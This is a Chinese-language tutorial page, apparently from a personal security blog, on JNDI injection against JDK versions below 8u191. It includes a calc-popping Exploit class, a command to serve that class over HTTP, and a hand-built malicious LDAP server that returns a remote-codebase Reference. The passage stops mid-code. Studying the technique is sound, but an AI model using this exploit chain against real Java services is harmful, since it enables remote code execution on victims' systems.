@@ -1,0 +1,779 @@
+<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>JNDI攻击（jdk 8u191 以下） | 1ux4ry Archive</title><meta name=description content="由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。"><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700;800&family=Space+Grotesk:wght@400;500;700&display=swap" rel=stylesheet><link rel=stylesheet href=/css/main.css></head><body><div class=site-bg></div><div class=site-shell><header class=topbar><a class=brand href=/><span>1ux4ry Archive</span></a><nav class=main-nav aria-label=主导航><a href=/>合集</a>
+<a href=/posts/>归档</a>
+<a href=/categories/>分类</a>
+<a href=/tags/>标签</a>
+<a href=/about/>关于</a>
+<a href=/friends/>友链</a>
+<a href=https://github.com/luxuryzcx>GitHub</a></nav></header><section class="page-block article-layout article-layout--with-toc"><aside class=article-toc aria-label=文章大纲><div class=article-toc__inner><p class=article-toc__kicker>ON THIS PAGE</p><div class=article-toc__content><nav id=TableOfContents><ul><li><ul><li><a href=#前言>前言</a></li><li><a href=#原理>原理</a></li><li><a href=#jdk-8u121以下>jdk 8u121以下</a></li><li><a href=#jdk-8u121-jdk8u191-之间>jdk 8u121-jdk8u191 之间</a></li><li><a href=#以ldap-为例-通杀8u191以下所有版本>以ldap 为例 (通杀8u191以下所有版本)</a><ul><li><a href=#恶意类>恶意类</a></li><li><a href=#启动http服务器>启动HTTP服务器</a></li><li><a href=#启动ldap服务器>启动LDAP服务器</a></li><li><a href=#触发受害者jndi注入>触发受害者JNDI注入</a></li></ul></li><li><a href=#过程示例>过程示例</a></li></ul></li></ul></nav></div></div></aside><article class=article-single><section class=article-hero-card aria-label="JNDI攻击（jdk 8u191 以下）"><div class="article-hero-card__glow article-hero-card__glow--cyan"></div><div class="article-hero-card__glow article-hero-card__glow--pink"></div><div class="article-hero-card__glow article-hero-card__glow--amber"></div><p class=article-hero-card__command>1ux4ry@archive:~# ./JAVA_安全_持续学习</p><div class=article-hero-card__title><span class=article-hero-card__title-main>Java 安全 持续学习</span>
+<span class=article-hero-card__title-sub>JNDI攻击（jdk 8u191 以下）</span></div><p class=article-hero-card__meta>安全研究 / Java 安全 持续学习 / 1ux4ry Archive</p><p class=article-hero-card__desc>由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。</p></section><header class=page-head><p class=page-kicker>ARTICLE</p><p class=article-series>Java 安全 持续学习</p><h1>JNDI攻击（jdk 8u191 以下）</h1><div class=single-meta><span>2026-06-14</span>
+<span>安全研究</span>
+<span># Java安全 # 安全研究</span></div></header><div class="page-copy content-body"><h2 id=前言>前言</h2><p>由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。这篇文章收录在「Java 安全 持续学习」系列中，用来沉淀对应主题的分析与记录。</p><h2 id=原理>原理</h2><p>远程类加载 （reference 远程工厂类注入）</p><p>JNDI 允许通过reference 对象将命令系统中的名称映射到外部资源 如果本地找不到对应资源 jvm就会去reference中指定的远程恶意服务器 下载并实例化类</p><p>两个 jvm 默认参数</p><p>com.sun.jndi.rmi.object.trustURLCodebase -> 控制 rmi 远程类加载</p><p>com.sun.jndi.cosnaming.object.trustURLCodebase -> 控制 ldap远程类加载</p><h2 id=jdk-8u121以下>jdk 8u121以下</h2><p>最完美的攻击阶段</p><p>rmi 和 ldap 当中 trustURLCodebase 默认都是 true</p><p>既可以 rmi:// 协议 也可以 ldap:// 协议</p><h2 id=jdk-8u121-jdk8u191-之间>jdk 8u121-jdk8u191 之间</h2><p>限制了 rmi</p><p>但是 ldap 仍然是 true</p><h2 id=以ldap-为例-通杀8u191以下所有版本>以ldap 为例 (通杀8u191以下所有版本)</h2><h3 id=恶意类>恶意类</h3><p>Exploit.java</p><p>然后编译</p><p>javac Exploit.java 得到 Exploit.class</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Exploit</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>static</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// 弹出计算器</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Runtime</span><span class=p>.</span><span class=na>getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=s>&#34;calc&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>e</span><span class=p>.</span><span class=na>printStackTrace</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
+</span></span></span></code></pre></div><h3 id=启动http服务器>启动HTTP服务器</h3><p>在恶意类的目录下开启</p><p>python本地起一个服务</p><p>python -m http.server 8000</p><h3 id=启动ldap服务器>启动LDAP服务器</h3><p>LdapRefServer.java</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>com.jndi</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>javax.naming.Reference</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>javax.naming.StringRefAddr</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>javax.naming.ldap.LdapContext</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.*</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.net.ServerSocket</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.net.Socket</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Hashtable</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * 恶意 LDAP 服务器
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * 使用纯 Socket 实现，不依赖第三方 LDAP SDK
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * 拦截 JNDI lookup 的搜索请求，返回包含 javaCodebase/javaFactory 的恶意 Reference 条目
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * 攻击流程：
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *   受害者 lookup(&#34;ldap://127.0.0.1:1389/Exploit&#34;)
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *   → LDAP 服务器返回 Reference
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *   → 受害者去 http://127.0.0.1:8000/Exploit.class 下载恶意类
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *   → 执行 Exploit 静态代码块 → 弹出计算器
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> */</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>LdapRefServer</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>LDAP_PORT</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>1389</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>HTTP_SERVER</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;http://127.0.0.1:8000/&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;========== 启动恶意 LDAP 服务器 ==========&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;监听端口: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>LDAP_PORT</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;远程 Codebase: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>HTTP_SERVER</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;等待受害者发送 JNDI lookup 请求...\n&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ServerSocket</span><span class=w> </span><span class=n>serverSocket</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ServerSocket</span><span class=p>(</span><span class=n>LDAP_PORT</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=kc>true</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Socket</span><span class=w> </span><span class=n>socket</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>serverSocket</span><span class=p>.</span><span class=na>accept</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>new</span><span class=w> </span><span class=n>Thread</span><span class=p>(()</span><span class=w> </span><span class=o>-&gt;</span><span class=w> </span><span class=n>handleConnection</span><span class=p>(</span><span class=n>socket</span><span class=p>)).</span><span class=na>start</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>handleConnection</span><span class=p>(</span><span class=n>Socket</span><span class=w> </span><span class=n>socket</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>socket</span><span class=p>.</span><span class=na>setSoTimeout</span><span class=p>(</span><span class=n>5000</span><span class=p>);</span><span class=w> </span><span class=c1>// 5秒超时</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>InputStream</span><span class=w> </span><span class=n>in</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>socket</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>OutputStream</span><span class=w> </span><span class=n>out</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>socket</span><span class=p>.</span><span class=na>getOutputStream</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// 循环处理 LDAP 请求</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=kc>true</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>request</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>request</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>readLdapMessage</span><span class=p>(</span><span class=n>in</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=c1>// 客户端关闭连接或超时</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>break</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kt>int</span><span class=w> </span><span class=n>messageId</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>parseMessageId</span><span class=p>(</span><span class=n>request</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kt>int</span><span class=w> </span><span class=n>operationType</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>parseOperationType</span><span class=p>(</span><span class=n>request</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>operationType</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>0x60</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=c1>// BindRequest [APPLICATION 0]</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[LDAP] 收到 Bind 请求, messageID=&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>messageId</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bindResponse</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>buildBindResponse</span><span class=p>(</span><span class=n>messageId</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>out</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>bindResponse</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>out</span><span class=p>.</span><span class=na>flush</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[LDAP] 已返回 Bind 成功响应&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>operationType</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>0x63</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=c1>// SearchRequest [APPLICATION 3]</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[LDAP] 收到 Search 请求, messageID=&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>messageId</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>searchEntryResponse</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>buildSearchEntryResponse</span><span class=p>(</span><span class=n>messageId</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>searchDoneResponse</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>buildSearchDoneResponse</span><span class=p>(</span><span class=n>messageId</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>out</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>searchEntryResponse</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>out</span><span class=p>.</span><span class=na>flush</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[LDAP] 已返回恶意 Reference 条目:&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;       javaCodebase = &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>HTTP_SERVER</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;       javaFactory  = Exploit\n&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>out</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>searchDoneResponse</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>out</span><span class=p>.</span><span class=na>flush</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[LDAP] 收到未知请求, operationType=0x&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>Integer</span><span class=p>.</span><span class=na>toHexString</span><span class=p>(</span><span class=n>operationType</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>socket</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// ignore</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * 读取一个完整的 LDAP 消息
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * LDAP 报文格式: Tag + Length + Value (BER 编码)
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>readLdapMessage</span><span class=p>(</span><span class=n>InputStream</span><span class=w> </span><span class=n>in</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 读取 Tag (1 byte)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>tag</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>in</span><span class=p>.</span><span class=na>read</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 读取 Length</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>length</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>readBerLength</span><span class=p>(</span><span class=n>in</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 读取 Value</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[</span><span class=n>length</span><span class=o>]</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>totalRead</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>totalRead</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>length</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>int</span><span class=w> </span><span class=n>read</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>in</span><span class=p>.</span><span class=na>read</span><span class=p>(</span><span class=n>value</span><span class=p>,</span><span class=w> </span><span class=n>totalRead</span><span class=p>,</span><span class=w> </span><span class=n>length</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>totalRead</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
